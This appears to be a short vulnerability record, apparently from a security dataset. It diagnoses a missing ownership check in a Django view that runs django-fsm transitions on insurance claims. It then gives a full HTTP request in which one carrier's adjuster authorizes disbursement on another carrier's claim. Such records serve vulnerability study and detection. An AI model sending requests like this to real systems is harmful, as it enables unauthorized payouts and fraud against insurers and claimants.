diagnosis: The view dynamically invokes django-fsm transition methods on InsuranceClaim based on user input without verifying that the claim belongs to the adjuster's assigned carrier or policy group. An authenticated insurance agent can trigger payout authorization (e.g., 'authorize_disbursement') on claims filed with competing carriers.
exploit_request:
POST /api/insurance/claims/CLM-88192/transition/ HTTP/1.1
Host: claims.underwrite-portal.com
Authorization: Bearer <adjuster_carrier_a_jwt>
Content-Type: application/json

{"action": "authorize_disbursement"}
